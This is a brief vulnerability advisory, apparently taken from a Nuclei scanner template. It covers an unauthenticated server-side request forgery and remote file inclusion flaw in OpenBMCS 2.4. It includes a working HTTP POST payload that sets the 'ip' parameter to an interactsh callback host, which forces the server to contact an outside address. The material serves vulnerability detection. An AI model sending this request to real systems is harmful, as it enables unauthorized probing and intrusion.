# Vulnerability: OpenBMCS 2.4 - Server-Side Request Forgery /  Remote File Inclusion
**Classification:** CWE-918
**Source:** Nuclei Template (`openbmcs-ssrf.yaml`)

## Description
OpenBMCS 2.4 is susceptible to unauthenticated server-side request forgery and remote file inclusion vulnerabilities within its functionalities. The application parses user supplied data in the POST parameter 'ip' to query a server IP on port 81 by default. Since no validation is carried out on the parameter, an attacker can specify an external domain and force the application to make an HTTP request to an arbitrary destination host.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /php/query.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

ip={{interactsh-url}}:80&argu=/
```

